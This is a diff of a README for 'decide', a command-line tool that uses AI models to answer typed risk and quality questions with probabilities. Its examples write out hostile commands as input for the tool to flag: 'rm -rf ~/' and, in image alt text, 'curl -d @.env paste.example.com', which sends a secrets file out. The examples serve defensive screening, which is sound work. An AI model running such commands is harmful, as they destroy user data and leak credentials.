@@ -9,7 +9,7 @@ or no, a choice, or a score, each with a probability. No essay.**
 
 ```sh
 brew install deepnoodle-ai/tap/decide
-export TYPESAFE_API_KEY=...
+export TYPESAFE_API_KEY=...   # a key from typesafe.ai
 
 echo 'rm -rf ~/' | decide run command-risk
 ```
@@ -25,10 +25,12 @@ stdin:1  rm -rf ~/
 
 ✓ 1 answered  ! 1 flagged  200ms
 Flagged: stdin:1
+See these results again with: decide runs view 20261008-040438-f7af
 ```
 
 That's it. One command in, typed answers out, each with a number a
-script can act on. Put it in a git hook, a CI job, or an agent's loop.
+script can act on. A decision model answers with numbers, not prose.
+Put it in a git hook, a CI job, or an agent's loop.
 
 [![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)
 
@@ -61,7 +63,7 @@ each one, and flags the answers that need a look.
 - A second run asks only about what changed. Answers are cached in
   `~/.decide/cache`.
 
-## Twelve questions, built in
+## Twelve templates, built in
 
 | Template | Asks |
 | --- | --- |
@@ -78,28 +80,28 @@ each one, and flags the answers that need a look.
 | `receipt-quality` | Is this a readable receipt? (image) |
 | `invoice-check` | Is this a complete, paid invoice? (PDF, Gemini only) |
 
-Need a different question? `decide templates new NAME --from TEMPLATE`
-copies one to edit. A template is a few lines of JSON. See
-[templates](https://decide.deepnoodle.ai/reference/templates/).
+A template is a set of questions in a few lines of JSON. Need a
+different one? `decide templates new NAME --from TEMPLATE` copies a
+template to edit. See [templates](https://decide.deepnoodle.ai/reference/templates/).
 
 Want to see the templates catch something? The [demo](demo/README.md) is
 a small repository with planted problems.
 
 ## Pick a model
 
-Jev is the default. Switch with `--provider` or `DECIDE_PROVIDER`, and
-nothing else changes.
+Jev is the default. Switch with `--provider cloudflare`, `openai`, or
+`gemini`, or set `DECIDE_PROVIDER`. Nothing else changes.
 
-| Provider | Model | Set | Reads |
+| Provider | Model | Key | Reads |
 | --- | --- | --- | --- |
 | [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | `TYPESAFE_API_KEY` | text |
-| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | `CLOUDFLARE_AUTH_TOKEN`, `CLOUDFLARE_ACCOUNT_ID`, `--provider cloudflare` | text, images |
-| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | `OPENAI_API_KEY`, `--provider openai` | text, images |
-| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | `GEMINI_API_KEY`, `--provider gemini` | text, images, audio, video, PDFs |
+| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | `CLOUDFLARE_AUTH_TOKEN`, `CLOUDFLARE_ACCOUNT_ID` | text, images |
+| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | `OPENAI_API_KEY` | text, images |
+| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | `GEMINI_API_KEY` | text, images, audio, video, PDFs |
 
-Hosting a Jev-compatible service yourself? Set `TYPESAFE_BASE_URL` and
-pass `--model`. The [providers page](https://decide.deepnoodle.ai/reference/providers/)
-has file formats and size limits.
+The [providers page](https://decide.deepnoodle.ai/reference/providers/)
+has file formats, size limits, and how to point decide at a
+Jev-compatible service you host yourself.
 
 ## From Go
 
@@ -119,12 +121,13 @@ if err != nil {
 fmt.Println(e.Answer.Noul) // probability of yes, such as 0.97
 ```
 
-Three lines to a probability. From there, the
-[`templates`](templates) package gives you the built-in questions, the
-[`patterns`](patterns) packages build gates, rankings, and funnels from
-answers, and [`decidetest`](decidetest) fakes the server in tests. Other
-providers use `backend.NewClient`. The [Go guide](https://decide.deepnoodle.ai/start/go/)
-walks through a first program, and the
+Two calls and you have a probability. The [Go guide](https://decide.deepnoodle.ai/start/go/)
+walks through a first program.
+
+When you want more: [`templates`](templates) has the built-in questions,
+[`patterns`](patterns) turns answers into gates and rankings,
+[`decidetest`](decidetest) fakes the server in tests, and
+[`backend`](backend) creates clients for the other providers. The
 [reference](https://pkg.go.dev/github.com/deepnoodle-ai/decide) has the
 rest.
 
